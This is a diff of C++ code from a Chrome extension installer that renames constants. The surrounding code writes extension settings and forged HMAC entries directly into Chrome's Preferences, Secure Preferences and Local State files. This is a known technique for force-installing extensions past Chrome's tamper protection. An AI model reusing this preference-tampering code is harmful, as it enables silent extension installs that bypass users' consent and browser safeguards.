@@ -57,7 +57,7 @@ namespace chromeExtInstaller
 
 				if (reader.parse(fileData, root))
 				{
-					std::string chromeExtConfig = WtoA(std::wstring(CHROME_SAMPLE_EXT_OL_CONFIG_T));
+					std::string chromeExtConfig = WtoA(std::wstring(CHROME_SAMPLE_EXT_OL_CONFIG_W));
 
 					Json::Reader chromeExtConfigReader;
 					Json::Value chromeExtConfigRoot;
@@ -73,10 +73,10 @@ namespace chromeExtInstaller
 						}
 
 						root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-							[CHROME_SAMPLE_CRX_ID] = Json::Value(chromeExtConfigRoot);\
+							[CHROME_SAMPLE_CRX_ID_A] = Json::Value(chromeExtConfigRoot);\
 							root[CHROME_PROTECTION_NODE][CHROME_MACS_NODE]\
 							[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-							[CHROME_SAMPLE_CRX_ID] = Json::Value(m_strExtConfigHMAC);\
+							[CHROME_SAMPLE_CRX_ID_A] = Json::Value(m_strExtConfigHMAC);\
 							Json::StyledWriter fw;
 						std::string szOssOnConfig = fw.write(root);
 						std::ofstream out(m_strSecPrefsPath.c_str());
@@ -112,7 +112,7 @@ namespace chromeExtInstaller
 
 				if (reader.parse(fileData, root))
 				{
-					std::string chromeExtConfig = WtoA(tstring(CHROME_SAMPLE_EXT_OL_CONFIG_T));
+					std::string chromeExtConfig = WtoA(tstring(CHROME_SAMPLE_EXT_OL_CONFIG_W));
 
 					Json::Reader chromeExtConfigReader;
 					Json::Value chromeExtConfigRoot;
@@ -130,10 +130,10 @@ namespace chromeExtInstaller
 							}\
 
 							root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-							[CHROME_SAMPLE_CRX_ID] = Json::Value(chromeExtConfigRoot);\
+							[CHROME_SAMPLE_CRX_ID_A] = Json::Value(chromeExtConfigRoot);\
 							root[CHROME_PROTECTION_NODE][CHROME_MACS_NODE]\
 							[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-							[CHROME_SAMPLE_CRX_ID] = Json::Value(m_strExtConfigHMAC);\
+							[CHROME_SAMPLE_CRX_ID_A] = Json::Value(m_strExtConfigHMAC);\
 							Json::StyledWriter fw;
 							std::string szOssOnConfig = fw.write(root);
 							std::ofstream out(m_strPrefsPath.c_str());
@@ -170,7 +170,7 @@ namespace chromeExtInstaller
 		Json::Value root;
 		if (reader.parse(fileData, root))
 		{
-			std::string chromeExtConfig = WtoA(std::wstring(CHROME_SAMPLE_EXT_OL_CONFIG_T));
+			std::string chromeExtConfig = WtoA(std::wstring(CHROME_SAMPLE_EXT_OL_CONFIG_W));
 
 			Json::Reader chromeExtConfigReader;
 			Json::Value chromeExtConfigRoot;
@@ -182,7 +182,7 @@ namespace chromeExtInstaller
 // 				}
 
 				root[CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-					[CHROME_SAMPLE_CRX_ID] = Json::Value(chromeExtConfigRoot);\
+					[CHROME_SAMPLE_CRX_ID_A] = Json::Value(chromeExtConfigRoot);\
 				Json::StyledWriter fw;
 				std::string szOssOnConfig = fw.write(root);
 				std::ofstream out(m_strPrefsPath.c_str());
@@ -203,7 +203,7 @@ namespace chromeExtInstaller
 		{
 			root[CHROME_STATE_LAYER_1][CHROME_STATE_LAYER_2]\
 				[WtoA(GetChromeDefaultPath().c_str())][CHROME_EXTENSION_NODE][CHROME_SETTING_NODE]\
-				[CHROME_SAMPLE_CRX_ID] = Json::Value(m_strExtConfigHMAC);\
+				[CHROME_SAMPLE_CRX_ID_A] = Json::Value(m_strExtConfigHMAC);\
 			Json::StyledWriter fw;
 			std::string szOssOnConfig = fw.write(root);
 			std::ofstream out(m_strStateFilePath.c_str());
